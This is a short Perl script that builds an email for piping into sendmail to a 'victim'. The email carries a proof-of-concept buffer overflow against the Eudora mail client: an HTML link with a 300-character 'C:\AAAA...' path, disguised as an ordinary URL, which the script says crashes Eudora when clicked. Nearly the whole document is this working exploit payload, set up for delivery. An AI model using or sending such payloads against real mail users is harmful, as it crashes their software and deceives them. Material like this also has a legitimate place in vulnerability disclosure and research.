#!/usr/bin/perl --
print "From: me\n";
print "To: you\n";
print "Subject: Eudora file URL buffer overflow demo\n";
print "X-Use: Pipe the output of this script into:  sendmail -i victim\n\n";
print "The following is a \"proper\" HTML URL, pointing to somewhere long:\n";
print "<x-html>\n";
print "<a href=\"C:\\", "A"x300, "\">\n";
print "Fake URL to http://anywhere/I/want</a>\n";
print "</x-html>\n";
print "Clicking above will crash Eudora.\n\n";
print "The following plain-text converted by Eudora into a clickable URL\n";
print "http://www.maths.usyd.edu.au:8000/u/psz/securepc.html#Eudoraxx\n";
print "is for comparison: the user can hardly tell them apart.\n\n";
